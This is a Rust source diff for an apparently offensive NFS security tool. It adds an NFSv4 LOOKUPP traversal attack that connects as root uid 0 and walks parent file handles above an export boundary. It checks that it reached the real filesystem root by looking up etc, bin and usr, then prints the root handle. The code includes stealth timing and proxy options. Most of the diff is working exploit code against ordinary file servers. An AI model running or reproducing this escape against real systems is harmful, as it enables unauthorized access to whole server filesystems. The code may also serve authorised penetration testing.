@@ -98,6 +98,16 @@ pub(crate) enum EscapeOutcome {
         /// NFS version that accepted the public handle.
         version: &'static str,
     },
+    /// NFSv4 LOOKUPP traversal escape -- reached the filesystem root by
+    /// chaining parent-directory lookups above the export boundary
+    /// (RFC 7530 S16.14). The server did not enforce subtree_check, so
+    /// repeated LOOKUPP walked from the export root up to the real
+    /// filesystem root.
+    Nfs4Lookupp {
+        /// The file handle pointing at the filesystem root, obtained via
+        /// GETFH after LOOKUPP traversal stabilised.
+        root_handle: FileHandle,
+    },
     /// Handle format is valid (STALE hits) but the root inode was not found
     /// within `2..=max_root_scan` -- a higher `--max-root-scan` may help.
     StaleNoRoot,
@@ -162,11 +172,22 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
                 EscapeOutcome::WebNfs { public_handle, version } => {
                     print_webnfs_success(&public_handle, version, host);
                 },
-                EscapeOutcome::StaleNoRoot => {
-                    eprintln!("{}", crate::output::status_err(&format!("NFSv2: handle format valid (STALE) but root not found in inodes 2..={max_root_scan}.")));
+                EscapeOutcome::Nfs4Lookupp { root_handle } => {
+                    print_nfs4_lookupp_success(&root_handle, host);
                 },
-                EscapeOutcome::Unsupported => {
-                    eprintln!("{}", crate::output::status_err("NFSv2: handle format rejected or export is already the filesystem root."));
+                EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
+                    // v2 handle construction failed -- try v4 LOOKUPP as last resort.
+                    if let Some(v4_outcome) = try_nfs4_escape(host, globals).await {
+                        if let EscapeOutcome::Nfs4Lookupp { ref root_handle } = v4_outcome {
+                            print_nfs4_lookupp_success(root_handle, host);
+                        }
+                        return Ok(());
+                    }
+                    if matches!(outcome, EscapeOutcome::StaleNoRoot) {
+                        eprintln!("{}", crate::output::status_err(&format!("NFSv2: handle format valid (STALE) but root not found in inodes 2..={max_root_scan}.")));
+                    } else {
+                        eprintln!("{}", crate::output::status_err("NFSv2: handle format rejected or export is already the filesystem root."));
+                    }
                 },
             }
             return Ok(());
@@ -181,27 +202,57 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
         EscapeOutcome::WebNfs { public_handle, version } => {
             print_webnfs_success(&public_handle, version, host);
         },
-        EscapeOutcome::StaleNoRoot => {
-            eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
+        EscapeOutcome::Nfs4Lookupp { root_handle } => {
+            print_nfs4_lookupp_success(&root_handle, host);
         },
-        EscapeOutcome::Unsupported => {
-            eprintln!("{}", crate::output::status_err("Export escape not available -- the export already is the filesystem root, or the server rejected the handle format (BADHANDLE / non-Linux)"));
+        EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
+            // v3 handle construction failed -- try v4 LOOKUPP as last resort.
+            if let Some(v4_outcome) = try_nfs4_escape(host, globals).await {
+                if let EscapeOutcome::Nfs4Lookupp { ref root_handle } = v4_outcome {
+                    print_nfs4_lookupp_success(root_handle, host);
+                }
+                return Ok(());
+            }
+            if matches!(outcome, EscapeOutcome::StaleNoRoot) {
+                eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
+            } else {
+                eprintln!("{}", crate::output::status_err("Export escape not available -- the export already is the filesystem root, or the server rejected the handle format (BADHANDLE / non-Linux)"));
+            }
         },
     }
     Ok(())
 }
 
-/// Try NFSv3 escape first, then NFSv2 fallback. Returns just the outcome
-/// (no client). Used by `scan --auto-escape` which doesn't need the client
-/// for post-escape reads.
+/// Try NFSv3 escape first, then NFSv2 fallback, then NFSv4 LOOKUPP.
+/// Returns just the outcome (no client). Used by `scan --auto-escape`
+/// which doesn't need the client for post-escape reads.
 pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<EscapeOutcome> {
     // Phase 0: WebNFS public handle probe -- one LOOKUP, no MOUNT needed.
     if let Some(outcome) = try_webnfs_escape(host, globals).await {
         return Ok(outcome);
     }
-    match find_escape(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
-        Ok((_client, outcome)) => Ok(outcome),
-        Err(_) => find_escape_v2(host, export, max_root_scan, globals).await,
+    let outcome = match find_escape(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
+        Ok((_client, o)) => o,
+        Err(_) => match find_escape_v2(host, export, max_root_scan, globals).await {
+            Ok(o) => o,
+            Err(_) => {
+                // Both MOUNT protocols failed -- try NFSv4 LOOKUPP (no MOUNT needed).
+                return Ok(try_nfs4_escape(host, globals).await.unwrap_or(EscapeOutcome::Unsupported));
+            },
+        },
+    };
+
+    // If v3/v2 handle construction didn't succeed, try v4 LOOKUPP as a
+    // fundamentally different escape mechanism before giving up.
+    match outcome {
+        EscapeOutcome::Success { .. } | EscapeOutcome::WebNfs { .. } | EscapeOutcome::Nfs4Lookupp { .. } => Ok(outcome),
+        EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
+            if let Some(v4) = try_nfs4_escape(host, globals).await {
+                Ok(v4)
+            } else {
+                Ok(outcome)
+            }
+        },
     }
 }
 
@@ -559,6 +610,132 @@ fn print_escape_success(candidate: &EscapeResult, note: &str, host: &str) {
     let hex = candidate.root_handle.to_hex();
     println!();
     println!("  {}  {:?}  (inode {}  {})", "Filesystem:".dimmed(), candidate.fs_type, candidate.inode_number, note);
+    crate::output::print_handle("Root handle", &hex);
+    crate::output::print_handle_next_steps(&hex, host);
+    println!();
+}
+
+/// NFSv4 LOOKUPP escape: traverse parent directories to reach the filesystem root.
+///
+/// NFSv4 LOOKUPP (op 16, RFC 7530 S16.14) resolves the parent directory of the
+/// current file handle. A compliant server returns NFS4ERR_NOENT at the export
+/// boundary, preventing traversal outside the exported subtree. Servers that do
+/// not enforce subtree_check (or have a misconfigured pseudo-filesystem) allow
+/// LOOKUPP to walk above the export root into the real filesystem.
+///
+/// The approach: obtain the pseudo-root FH via PUTROOTFH, then issue
+/// PUTFH(current) + LOOKUPP + GETFH in a loop until the handle stops changing
+/// (the filesystem root is its own parent). If the final handle differs from
+/// the export root handle, the export boundary has been crossed.
+///
+/// No MOUNT protocol is needed -- NFSv4 connects directly to port 2049.
+async fn try_nfs4_escape(host: &str, globals: &GlobalOpts) -> Option<EscapeOutcome> {
+    use crate::proto::nfs4::compound::Nfs4DirectClient;
+    use crate::proto::nfs4::types::{ArgOp, ResOpData};
+
+    /// Safety cap on LOOKUPP traversal depth to prevent infinite loops on
+    /// misbehaving servers.
+    const MAX_DEPTH: usize = 64;
+
+    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
+    let stealth = StealthConfig::new(globals.delay, globals.jitter);
+
+    // Connect with AUTH_SYS uid=0 first (most permissive); fall back to AUTH_NONE.
+    let mut client = match Nfs4DirectClient::connect_with_auth_proxy(addr, 0, 0, "localhost", globals.proxy.as_deref()).await {
+        Ok(c) => c,
+        Err(_) => match Nfs4DirectClient::connect_proxy(addr, globals.proxy.as_deref()).await {
+            Ok(c) => c,
+            Err(_) => return None,
+        },
+    };
+    client = client.with_stealth(stealth);
+
+    // Get the pseudo-root FH (PUTROOTFH + GETFH). On Linux knfsd this is the
+    // export's root directory when the export is the only one; on servers with
+    // a real pseudo-filesystem it is the synthetic root.
+    let export_fh = client.get_root_fh().await.ok()?;
+
+    // LOOKUPP loop: traverse parent directories until the handle stabilises
+    // or the server rejects the request (NFS4ERR_NOENT at the boundary).
+    let mut current_fh = export_fh.clone();
+    let mut depth: usize = 0;
+
+    loop {
+        if depth >= MAX_DEPTH {
+            tracing::debug!("NFSv4 LOOKUPP hit depth cap ({MAX_DEPTH}) -- aborting");
+            return None;
+        }
+
+        let ops = vec![ArgOp::Putfh(current_fh.clone()), ArgOp::Lookupp, ArgOp::Getfh];
+        let res = client.compound(ops).await.ok()?;
+
+        if res.status != 0 {
+            // LOOKUPP failed -- likely NFS4ERR_NOENT at the export boundary.
+            if depth == 0 {
+                tracing::debug!(status = res.status, "NFSv4 LOOKUPP failed on first attempt -- export boundary enforced");
+                return None;
+            }
+            // Traversed at least one level before hitting the wall; current_fh
+            // is as high as we got.
+            break;
+        }
+
+        // Extract the parent FH from the GETFH result.
+        let parent_fh = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })?;
+
+        // Handle stopped changing -- we've reached the filesystem root
+        // (the root directory is its own parent).
+        if parent_fh == current_fh {
+            break;
+        }
+
+        current_fh = parent_fh;
+        depth += 1;
+    }
+
+    // If the final handle is the same as the export root, the export already IS
+    // the filesystem root -- nothing to escape to.
+    if current_fh == export_fh {
+        tracing::debug!("NFSv4 LOOKUPP: export already is the filesystem root");
+        return None;
+    }
+
+    // Verify by looking up a well-known top-level directory entry (etc, bin, ...).
+    // Even if verification fails the handle is still above the export, so report
+    // it -- the operator can decide whether to use it.
+    let verified = verify_nfs4_root(&mut client, &current_fh).await;
+    if verified {
+        tracing::info!(depth, "NFSv4 LOOKUPP escape confirmed -- filesystem root reached");
+    } else {
+        tracing::info!(depth, "NFSv4 LOOKUPP escape: reached handle above export root (root not positively confirmed)");
+    }
+
+    let root_handle = FileHandle::from_bytes(&current_fh);
+    Some(EscapeOutcome::Nfs4Lookupp { root_handle })
+}
+
+/// Verify an NFSv4 file handle points to the filesystem root by attempting to
+/// LOOKUP customary top-level entries (etc, bin, usr, var, lib). A successful
+/// LOOKUP of any of these confirms the handle is the real filesystem root.
+async fn verify_nfs4_root(client: &mut crate::proto::nfs4::compound::Nfs4DirectClient, fh: &[u8]) -> bool {
+    use crate::proto::nfs4::types::ArgOp;
+
+    for name in ["etc", "bin", "usr", "var", "lib"] {
+        let ops = vec![ArgOp::Putfh(fh.to_vec()), ArgOp::Lookup(name.to_owned()), ArgOp::Getfh];
+        if let Ok(res) = client.compound(ops).await
+            && res.status == 0
+        {
+            return true;
+        }
+    }
+    false
+}
+
+/// Print the NFSv4 LOOKUPP escape success report.
+fn print_nfs4_lookupp_success(root_handle: &FileHandle, host: &str) {
+    let hex = root_handle.to_hex();
+    println!();
+    println!("  {}  NFSv4 LOOKUPP traversal -- filesystem root reached (RFC 7530 S16.14)", "[+]".bold().green());
     crate::output::print_handle("Root handle", &hex);
     crate::output::print_handle_next_steps(&hex, host);
     println!();
